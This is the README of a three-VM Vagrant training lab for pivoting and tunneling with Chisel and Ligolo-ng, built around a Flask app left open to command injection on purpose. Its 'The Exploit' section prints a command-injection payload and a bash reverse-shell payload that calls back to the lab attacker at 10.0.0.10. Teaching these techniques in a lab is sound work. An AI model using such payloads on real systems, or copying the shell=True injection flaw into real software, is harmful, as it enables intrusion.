# Pivoting & Tunneling — Practical Lab

A self-contained 3-VM lab for demonstrating pivoting and tunneling techniques
using **Chisel** and **Ligolo-ng**.

## Network Topology

```
[Attacker 10.0.0.10] ──── internet-net (10.0.0.0/24) ────► [Pivot 10.0.0.20]
                                                                     │
                                                            internal-net (192.168.100.0/24)
                                                                     │
                                                                     ▼
                                                           [Target 192.168.100.30]
```

The attacker **cannot** reach the target directly. It must go through the pivot.

## VMs

| VM | Role | IP(s) | Services |
|---|---|---|---|
| attacker | Kali Linux | 10.0.0.10 | Chisel, Ligolo-ng proxy |
| pivot | Ubuntu 22.04 | 10.0.0.20 / 192.168.100.20 | Vulnerable Flask app (:80) |
| target | Ubuntu 22.04 | 192.168.100.30 | Internal app (:8080), SSH (:22) |

## Requirements

- [Vagrant](https://www.vagrantup.com/)
- [VirtualBox](https://www.virtualbox.org/)
- ~6GB RAM free
- ~15GB disk space

## Usage

```bash
# Start all VMs (takes ~10 min first time)
vagrant up

# Start a specific VM only
vagrant up pivot

# SSH into a VM
vagrant ssh attacker

# Stop everything
vagrant halt

# Destroy everything
vagrant destroy -f
```

## File Structure

```
pivot-lab/
├── Vagrantfile
├── ATTACK_CHEATSHEET.md   ← step-by-step demo commands
├── vm2-pivot/
│   ├── app.py             ← vulnerable Flask app (command injection)
│   └── templates/
│       ├── index.html
│       └── ping.html
└── vm3-target/
    ├── internal_app.py    ← internal secret Flask app
    └── templates/
        └── secret.html    ← the "prize" page with the flag
```

## The Exploit

The Flask app on the pivot machine has an intentional command injection
vulnerability in the `/ping` endpoint. Input is passed directly to `shell=True`
without sanitization.

**Payload to get RCE:**
```
127.0.0.1; id
```

**Payload for reverse shell:**
```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.0.0.10/4444 0>&1'
```

See `ATTACK_CHEATSHEET.md` for the full walkthrough.

---

> ⚠️ For educational purposes only. Run in an isolated environment.
